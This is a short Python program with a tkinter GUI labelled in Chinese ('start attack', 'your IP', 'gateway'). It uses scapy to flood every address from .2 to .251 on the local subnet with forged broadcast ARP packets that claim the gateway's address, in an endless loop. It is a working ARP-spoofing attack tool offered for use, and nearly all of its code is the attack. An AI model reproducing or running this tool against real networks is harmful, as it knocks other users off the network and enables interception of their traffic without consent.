from tkinter import*
from tkinter import messagebox
import threading
from scapy.all import ARP,Ether,sendp
bools = False

tk = Tk()
tk.title('arp多人')
tk.geometry('300x160+420+200')



#--------------------------------

def ip_hz():
    ips = []
    for i in range(2,252):
        ips.append(i)
    return ips
def ips(ip_houzui,my_IP,ip2):
    ips1 = []
    for i in ip_houzui:
        ip4 = ip2[:10]
        ip3 = ip4 + str(i)
        ips1.append(ip3)
    ips1.remove(my_IP)
    return ips1          #生成ip列表
def arpspoof(targt,ip2):
    try:
        pkt = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=targt,psrc=ip2)#构造包
        sendp(pkt)
    except:
        print('[#]失败')
def main_arpspoof(my_IP,ip2):
    messagebox.showinfo("ARP","攻击开始,详情请见命令行")
    print('[*]您选择了arp(多人)')
    ip_houzui = ip_hz()
    ip_list = ips(ip_houzui=ip_houzui,my_IP=my_IP,ip2=ip2)
    print('[*]targt:',ip_list)
    while bools:
        for targt in ip_list:
            arpspoof(targt=targt,ip2=ip2)#循环发送
        print('[*]已经搞了所有人一遍')
    messagebox.showinfo("ARP","攻击结束")

#---------------------------------
def start_arp():
    global bools
    my_IP = en.get()
    ip2 = en_1.get()
    bools = True
    t = threading.Thread(target=main_arpspoof, args=(my_IP,ip2))
    t.start()
def stop_arp():
    global bools
    bools = False
    return True

#----------------input-------------
en = Entry(tk)
en.place(x=80,y=5)
en_1 = Entry(tk)
en_1.place(x=80,y=50)

#-----------------text------------
w= Label(tk,text='你的IP:',fg="red")
w.place(x=20,y=5)
w_2= Label(tk,text='网关:',fg="red")
w_2.place(x=20,y=50)

#----------------butter----------

b = Button(tk, text ="开始攻击", command=start_arp)
b.place(x=20,y=80)
b_2 = Button(tk, text ="停止", command=stop_arp)
b_2.place(x=200,y=80)
tk.mainloop()

#-------------other----------